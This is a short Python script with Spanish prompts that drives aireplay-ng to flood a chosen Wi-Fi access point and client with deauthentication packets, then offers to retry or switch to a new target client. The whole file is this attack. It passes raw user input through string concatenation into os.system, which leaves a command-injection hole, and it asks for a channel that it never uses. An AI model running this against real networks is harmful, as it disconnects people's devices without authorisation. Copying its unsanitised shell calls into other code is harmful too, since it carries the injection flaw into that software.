import os
import time
import sys

interfaz = sys.argv[1]

def deauth(num, mac_ap, mac_cliente, interfaz):
	os.system("aireplay-ng --deauth " + num + " -a " + mac_ap + " -c " + mac_cliente + " " + interfaz)
	print("0: Salir")
	print("1: Reintentar")
	print("2: Cambiar MAC cliente")
	op = input(">>> ")
	if op == '0':
		print("Cerrando...")
		time.sleep(2)	
	elif op == '1':
		os.system("clear")
		print("Reintentando...")
		deauth(num, mac_ap, mac_cliente, interfaz)
	elif op == '2':
		os.system("clear")
		mac_cliente = input("Introduce la nueva MAC de cliente > ")
		deauth(num, mac_ap, mac_cliente, interfaz)
		
num = input("Numero de paquetes > ")
mac_ap = input("MAC AP > ")
mac_cliente = input("MAC Cliente > ")
c = input("Canal > ")
deauth(num, mac_ap, mac_cliente, interfaz)



